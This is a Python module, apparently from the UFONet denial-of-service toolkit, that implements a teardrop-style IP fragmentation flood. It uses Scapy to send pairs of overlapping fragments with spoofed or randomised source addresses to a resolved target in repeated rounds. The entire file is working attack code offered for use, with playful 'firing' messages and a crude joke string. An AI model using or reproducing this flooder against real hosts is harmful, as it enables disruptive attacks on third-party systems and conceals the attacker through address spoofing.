#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket

from core.mods.mod_config import OVERLAP_SPEED
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet IP FRAGMENTATION (by overlapping) flooder (OVERLAP)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def randPort(start, end):
    x = random.randint(start, end)
    return x

def overlapize(ip, sport, rounds, address_dict):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            if address_dict['start'] is not None and address_dict['end'] is not None:
                s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
            else:
                s_zombie_port = randInt() 
            IP_p = IP()
            if address_dict['source'] is None:
                print("[Info] [OVERLAP] Using random source IP")
                IP_p.src = randIP()
            else:
                print("[Info] [OVERLAP] Using given source IP")
                IP_p.src = address_dict['source']
            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [OVERLAP] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            try:
                payload="A"*15
                overlap="B"*9 # overlap size
                send(IP(src=IP_p.src, dst=IP_p.dst, id=12345, flags=0x1, frag=0)/payload, verbose=0)
                send(IP(src=IP_p.src, dst=IP_p.dst, id=12345, flags=0x0, frag=1)/overlap, verbose=0) # teardrop frag
                print("[Info] [AI] [OVERLAP] Firing 'deuterium gravitons' ["+str(n)+"] -> [OVERLAPPING!]")
                time.sleep(1/OVERLAP_SPEED) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [OVERLAP] Failed to engage with 'deuterium gravitons' ["+str(n)+"]")
    except:
        print("[Error] [AI] [OVERLAP] Failing to engage... -> Is still target online? -> [Checking!]")

class OVERLAP(object):
    def attacking(self, target, rounds, address_dict):
        print("[Info] [AI] 'IP OVERLAPPING' (OVERLAPGER) is ready to fire: [" , rounds, "deuterium gravitons ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [OVERLAP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        overlapize(ip, sport, rounds, address_dict) # attack with OVERLAP using threading
